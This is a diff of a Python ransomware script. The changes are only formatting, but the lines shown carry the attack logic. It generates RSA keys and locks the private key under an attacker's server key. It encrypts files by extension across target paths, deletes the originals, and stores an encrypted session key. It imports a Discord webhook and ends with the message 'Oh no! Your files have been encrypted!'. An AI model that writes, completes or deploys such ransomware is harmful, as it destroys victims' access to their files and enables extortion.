@@ -11,11 +11,20 @@ from Crypto.PublicKey import RSA
 from discord_webhook import DiscordWebhook
 import socket
 import sys
+
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 from utils import *
 import pickle
 import gc
-from utils import fileExtensions, server_public_key, encrypted_client_private_key_path, client_public_key_path, ransomware_path, maxWorker
+from utils import (
+    fileExtensions,
+    server_public_key,
+    encrypted_client_private_key_path,
+    client_public_key_path,
+    ransomware_path,
+    maxWorker,
+)
+
 
 def generateEncryptThreads(fileExtensions, password, removeFiles, path):
     fileExtensionFormatted = getTargetFiles(fileExtensions)
@@ -32,6 +41,7 @@ def generateEncryptThreads(fileExtensions, password, removeFiles, path):
         for filePath in filePaths:
             filePath.unlink()
 
+
 def menu():
     if os.path.exists(ransomware_path):
         pass
@@ -41,19 +51,19 @@ def menu():
     key = RSA.generate(bit_len)
     private_key_PEM = key.exportKey()
     public_key_PEM = key.publickey().exportKey()
-    
+
     Client_private_key = private_key_PEM
     Client_public_key = public_key_PEM
-    encrypted_client_private_key = encrypt_keyfile(Client_private_key,
-                                                    server_public_key)
+    encrypted_client_private_key = encrypt_keyfile(
+        Client_private_key, server_public_key
+    )
 
-    with open(encrypted_client_private_key_path, 'wb') as output:
+    with open(encrypted_client_private_key_path, "wb") as output:
         pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
-    
-    
-    with open(client_public_key_path, 'wb') as f:
+
+    with open(client_public_key_path, "wb") as f:
         f.write(Client_public_key)
-    
+
     private_key_PEM = None
     Client_private_key = None
     rsa_object = None
@@ -61,8 +71,8 @@ def menu():
     del rsa_object
     del Client_private_key
     gc.collect()
-    
-    client_public_key_object =  RSA.importKey(Client_public_key)
+
+    client_public_key_object = RSA.importKey(Client_public_key)
     client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)
 
     removeFiles = True
@@ -74,7 +84,6 @@ def menu():
     #   only append this path if you want to encrypt all files in your user directory(desktop, documents, downloads, etc.)
     #   paths.append(userdata)
 
-
     format = "%(asctime)s: %(message)s"
     logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
     chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
@@ -84,8 +93,8 @@ def menu():
     recipient_key = RSA.import_key(open(client_public_key_path).read())
     cipher_rsa = PKCS1_OAEP.new(recipient_key)
     enc_session_key = cipher_rsa.encrypt(session_key)
-    with open (ransomware_path + "\\session_key.txt", "wb") as f:
-        f.write(enc_session_key)   
+    with open(ransomware_path + "\\session_key.txt", "wb") as f:
+        f.write(enc_session_key)
 
     hostname = socket.gethostname()
     for x in paths:
@@ -104,6 +113,7 @@ def menu():
         gc.collect()
     print(f"Oh no! Your files have been encrypted!")
 
+
 menu()
-#open decryptor
+# open decryptor
 exit()
